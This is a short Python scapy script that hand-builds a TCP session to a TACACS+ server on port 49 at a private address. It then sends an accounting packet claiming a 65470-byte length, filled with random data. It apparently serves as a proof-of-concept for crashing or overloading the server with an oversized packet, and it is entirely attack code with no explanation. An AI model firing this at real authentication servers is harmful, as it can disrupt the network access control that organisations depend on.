#!/usr/bin/python
from scapy.all import *

class Tacacs(Packet):
    name = "Tacacs+"
    fields_desc=[ XByteField("major_version/minor_version", 0xc0),
	ByteEnumField("type", 3, {1:"Authentication", 2:"Authorization", 3:"Accounting"}),
	ByteField("seq_no", 1),
	XByteField("flags", 1),
	IntField("session_id", random.SystemRandom().randint(1, 2147483647)),
	IntField("length", 43)]

#Open the TCP connection
syn = IP(dst='172.16.203.140') / TCP(dport=49,flags='S')
syn_ack = sr1(syn)
syn_ack

#Create and send the payload
t = IP(dst='172.16.203.140')/TCP(dport=49,sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack,ack=syn_ack[TCP].seq + 1, flags='A')/Tacacs(length=65470)/Raw(RandString(size=65470))

send(t)

